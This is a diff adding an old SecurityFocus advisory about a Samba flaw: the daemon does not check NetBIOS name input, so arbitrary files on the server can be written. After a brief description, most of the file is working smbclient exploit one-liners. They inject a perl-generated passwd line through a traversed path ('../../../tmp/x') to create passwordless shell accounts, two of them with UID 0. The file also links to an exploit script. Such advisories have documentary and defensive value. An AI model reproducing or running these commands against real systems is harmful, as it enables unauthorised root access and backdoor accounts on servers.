@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/2928/info
+
+Samba is a freely available file and printer sharing application maintained and developed by the Samba Development Team. Samba allows file and printer sharing between operating systems on the Unix and Microsoft platforms.
+
+A remote local user can write arbitrary files on the Samba server, as the smb daemon does not sufficiently check NetBIOS name input. It is possible to overwrite files on the Samba server, and if a user has local access, potentially gain elevated privileges.
+
+This problem makes it possible for a remote user to deny service to legitimate users, and a local user to potentially gain elevated privileges. 
+
+smbclient //NIMUE/"`perl -e '{print "\ntoor::0:0::/:/bin/sh\n"}'`" -n ../../../tmp/x -N
+
+From zhhsun <zhhsun@xanet.edu.cn>
+
+smbclient //NIMUE/"`perl -e '{print "\nopendoor::511:511::/:/bin/sh\n"}'`" -n ../../../tmp/x -N -I 192.168.12.13
+
+and also
+
+smbclient //NIMUE/"`perl -e '{print "\ntoor::0:0::/:/bin/sh\n"}'`" -n ../../../tmp/x -N -I 192.168.12.13
+
+Yugo Yugos <yuggoboy@hotmail.com> provided an exploit script. It is available at http://www.securityfocus.com/data/vulnerabilities/exploits/samba-exp.sh 
